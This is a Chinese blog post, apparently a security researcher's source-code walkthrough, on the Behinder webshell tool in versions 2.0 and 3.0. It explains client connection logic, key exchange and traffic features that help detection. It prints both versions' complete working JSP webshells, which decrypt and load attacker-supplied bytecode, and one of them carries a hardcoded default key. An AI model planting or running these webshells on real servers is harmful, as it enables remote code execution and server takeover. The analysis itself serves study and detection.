@@ -1,0 +1,352 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Behinder源码初探 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Behinder源码初探 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+继哥斯拉源码的分析以后来看看冰蝎的源码，这里拿的是冰蝎3.0的版本来看的，我比较懒，直接把jar包改成zip，然后直接看class文件了
+Behinder2.0
+自带的webshell文件如下
+&lt;%@ page import=&..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Behinder源码初探
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703112720393.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>继哥斯拉源码的分析以后来看看冰蝎的源码，这里拿的是冰蝎3.0的版本来看的，我比较懒，直接把jar包改成zip，然后直接看class文件了</p>
+<h1 id="behinder20">Behinder2.0</h1>
+<p>自带的webshell文件如下</p>
+<pre><code class="language-jsp">&lt;%@ page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
+&lt;%!class
+    U extends ClassLoader{
+        U(ClassLoader c){super(c);}
+        public Class g(byte []b){
+            return super.defineClass(b,0,b.length);
+        }
+    }
+%&gt;
+
+  &lt;%
+  if(request.getParameter(&quot;pass&quot;)!=null){
+        String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);
+        session.putValue(&quot;u&quot;,k);
+        out.print(k);
+        return;
+    }
+    Cipher c=Cipher.getInstance(&quot;AES&quot;);
+    c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));
+    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+   %&gt;
+</code></pre>
+<p>自定义一个类加载器，g方法中调用了父类的defineclass方法，如果有请求参数pass，获取一个随机的UUID的前16位，然后放到session当中，如果get没传入pass，会去session中拿到放入session的密钥，然后先base64后AES解密，然后用defineclass加载字节码</p>
+<p>大致过程如下</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703112720393.png" alt="image-20220703112720393" loading="lazy"></figure>
+<p>get请求就是密钥协商部分</p>
+<p>然后我们来看客户端的代码，把jar改成zip解压缩，就可以得到class文件了,首先先看<code>net/rebeyond/behinder/ui/BasicInfoUtils.class</code>，他有个getBasicInfo方法，应该是获取基本信息的</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703121322039.png" alt="image-20220703121322039" loading="lazy"></figure>
+<p>初始化了一个shellService的类，跟进</p>
+<pre><code class="language-java">public ShellService(JSONObject shellEntity, String userAgent) throws Exception {
+    this.encryptType = Constants.ENCRYPT_TYPE_AES;
+    this.beginIndex = 0;
+    this.endIndex = 0;
+    this.shellEntity = shellEntity;
+    this.currentUrl = shellEntity.getString(&quot;url&quot;);
+    this.currentType = shellEntity.getString(&quot;type&quot;);
+    this.currentPassword = shellEntity.getString(&quot;password&quot;);
+    this.currentHeaders = new HashMap();
+    this.currentHeaders.put(&quot;User-Agent&quot;, userAgent);
+    if (this.currentType.equals(&quot;php&quot;)) {
+        this.currentHeaders.put(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+    }
+
+    this.mergeHeaders(this.currentHeaders, shellEntity.getString(&quot;headers&quot;));
+    Map&lt;String, String&gt; keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
+    String cookie = (String)keyAndCookie.get(&quot;cookie&quot;);
+    if ((cookie == null || cookie.equals(&quot;&quot;)) &amp;&amp; !this.currentHeaders.containsKey(&quot;cookie&quot;)) {
+        String urlWithSession = (String)keyAndCookie.get(&quot;urlWithSession&quot;);
+        if (urlWithSession != null) {
+            this.currentUrl = urlWithSession;
+        }
+
+        this.currentKey = (String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get(&quot;key&quot;);
+    } else {
+        this.mergeCookie(this.currentHeaders, cookie);
+        this.currentKey = (String)keyAndCookie.get(&quot;key&quot;);
+        if (this.currentType.equals(&quot;php&quot;) || this.currentType.equals(&quot;aspx&quot;)) {
+            this.beginIndex = Integer.parseInt((String)keyAndCookie.get(&quot;beginIndex&quot;));
+            this.endIndex = Integer.parseInt((String)keyAndCookie.get(&quot;endIndex&quot;));
+        }
+    }
+
+}
+</code></pre>
+<p>他的构造方法如上，首先初始化了一些属性的值，并且设置了UA头等，判断webshell是否是php类型，如果是会加上Content-type头，调用了自身的mergeHeaders方法</p>
+<pre><code class="language-java">private void mergeCookie(Map&lt;String, String&gt; headers, String cookie) {
+    if (headers.containsKey(&quot;Cookie&quot;)) {
+        String userCookie = (String)headers.get(&quot;Cookie&quot;);
+        headers.put(&quot;Cookie&quot;, userCookie + &quot;;&quot; + cookie);
+    } else {
+        headers.put(&quot;Cookie&quot;, cookie);
+    }
+
+}
+</code></pre>
+<p>这里很简单，就是合并一下cookie，后面是调用了net/rebeyond/behinder/utils/Utils.class类的getKeyAndCookie方法，这里有点长，也是比较重要的一部分</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703122218741.png" alt="image-20220703122218741" loading="lazy"></figure>
+<p>判断https和http啥的就不多说了，我们直接按照正常的逻辑去读</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703122633293.png" alt="image-20220703122633293" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703122928443.png" alt="image-20220703122928443" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703123749703.png" alt="image-20220703123749703" loading="lazy"></figure>
+<p>看完了getKeyAndCookie方法，shellService的构造方法也就差不多了，回到getBasicInfo方法，其中在调用完getKeyAndCookie方法后，有一个<code>JSONObject basicInfoObj = new JSONObject(mainShell.currentShellService.getBasicInfo());</code>他这就是获取木马的基本信息，跟进</p>
+<pre><code class="language-java">public String getBasicInfo() throws Exception {
+    String result = &quot;&quot;;
+    Map&lt;String, String&gt; params = new LinkedHashMap();
+    byte[] data = Utils.getData(this.currentKey, this.encryptType, &quot;BasicInfo&quot;, params, this.currentType);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])resultObj.get(&quot;data&quot;);
+
+    try {
+        result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+        return result;
+    } catch (Exception var7) {
+        var7.printStackTrace();
+        throw new Exception(&quot;请求失败:&quot; + new String(resData, &quot;UTF-8&quot;));
+    }
+}
+</code></pre>
+<p>获取payload部分是<code>byte[] data = Utils.getData(this.currentKey, this.encryptType, &quot;BasicInfo&quot;, params, this.currentType);</code>，继续跟进</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703125112089.png" alt="image-20220703125112089" loading="lazy"></figure>
+<p>解密完以后就是返回payload的执行结果了</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703130416550.png" alt="image-20220703130416550" loading="lazy"></figure>
+<p>最后来简单测试一下,抓个包看看,给我们的冰蝎上个代理</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703131422398.png" alt="image-20220703131422398" loading="lazy"></figure>
+<p>这是那俩key1和key2的包，可以看到返回的包里是有16位的类似于md5的内容，这俩包就是密钥协商部分，在冰蝎3.0后取消了密钥协商。</p>
+<h1 id="behinder30">Behinder3.0</h1>
+<p>核心代码位于net.rebeyond.behinder包下，先来看他自带的webshell的文件吧</p>
+<pre><code class="language-jsp">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;
+&lt;%!
+class U extends ClassLoader{
+    U(ClassLoader c){
+        super(c);
+    }
+    public Class g(byte []b){
+        return super.defineClass(b,0,b.length);
+    }}
+%&gt;
+&lt;%
+if (request.getMethod().equals(&quot;POST&quot;)){
+    String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+    session.putValue(&quot;u&quot;,k);
+    Cipher c=Cipher.getInstance(&quot;AES&quot;);
+    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+    }
+%&gt;
+</code></pre>
+<p>首先还是自定义了一个类加载器u，有个g方法，调用父类的defineClass方法，然后验证请求方式是否为POST，如果是，把连接密码的md5值的前16位放入到seesion中设置属性，然后new一个u类的对象，然后调用g方法，主要是把请求的内容读取然后进行base64解码和aes解密恢复字节码并加载，这里就和冰蝎2有区别了</p>
+<p>来看客户端代码，首先先看<code>net/rebeyond/behinder/ui/controller/MainWindowController.class</code></p>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703132604185.png" alt="image-20220703132604185" loading="lazy"></figure>
+<p>来看这个doConnect</p>
+<pre><code class="language-java">private void doConnect() throws Exception {
+    boolean connectResult = this.currentShellService.doConnect();
+}
+</code></pre>
+<p>调用了<code>this.currentShellService.doConnect</code>方法，这里的cuurentShellService和冰蝎那个2.0差不多，只不过这里是在init方法中初始化，<code>this.currentShellService = new ShellService(shellEntity);</code></p>
+<pre><code class="language-java">public ShellService(JSONObject shellEntity) throws Exception {
+    this.encryptType = Constants.ENCRYPT_TYPE_AES;
+    this.beginIndex = 0;
+    this.endIndex = 0;
+    this.shellEntity = shellEntity;
+    this.currentUrl = shellEntity.getString(&quot;url&quot;);
+    this.currentType = shellEntity.getString(&quot;type&quot;);
+    this.currentPassword = shellEntity.getString(&quot;password&quot;);
+    this.currentHeaders = new HashMap();
+    this.initHeaders();
+    this.mergeHeaders(this.currentHeaders, shellEntity.getString(&quot;headers&quot;));
+}
+</code></pre>
+<p>来看doConnect，这里获取key就不是通过密钥协商了，他会直接获取连接密码的前16位md5值</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703133459091.png" alt="image-20220703133459091" loading="lazy"></figure>
+<p>看完doConnect，继续往下看，看过冰蝎2.0的师傅知道在冰蝎2.0的地方获取连接信息的也是这个getBasicInfo，跟进就完了</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220703133817089.png" alt="image-20220703133817089" loading="lazy"></figure>
+<pre><code class="language-jAVA">public String getBasicInfo(String whatever) throws Exception {
+    String result = &quot;&quot;;
+    Map&lt;String, String&gt; params = new LinkedHashMap();
+    params.put(&quot;whatever&quot;, whatever);
+    byte[] data = Utils.getData(this.currentKey, this.encryptType, &quot;BasicInfo&quot;, params, this.currentType);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])((byte[])resultObj.get(&quot;data&quot;));
+
+    try {
+        result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+        return result;
+    } catch (Exception var8) {
+        throw new Exception(&quot;请求失败:&quot; + new String(resData, &quot;UTF-8&quot;));
+    }
+}
+</code></pre>
+<p>后面的部分貌似差不多，这里不再详细说了</p>
+<h1 id="总结">总结</h1>
+<p>冰蝎2.0有密钥协商过程，这就导致他的特征会比较明显，在连接的时候会有俩包，返回的值是16位的md5，然后就是一个payload的包，但是在冰蝎3.0中整个过程都是加密传输，没法检测关键字，他去除了密钥协商过程，就导致一个情况，冰蝎2.0的密钥是随机的，但是冰蝎3.0的密钥是固定的，在传输php，aspx，jsp时前面的字段是固定的，这就导致了在一个WebShell中每一个流的前面的字节都是相同，php前面是 assert|eval(base64_decode(、csharp是dll文件的头部格式、java则是class文件的头部格式。由于asp（php无法加载openssl时）采用异或对payload进行运算，根据异或的特征（两次异或即还原数据）可以使用密文以原始的payload的前十六位进行异或得到的就是密钥，再用密钥对整体数据进行解密即可还原出明文。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#behinder20">Behinder2.0</a></li>
+<li><a href="#behinder30">Behinder3.0</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/java-fan-xu-lie-hua-lian-er-zhou-mu/">
+              <h3 class="post-title">
+                Java反序列化链二周目
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
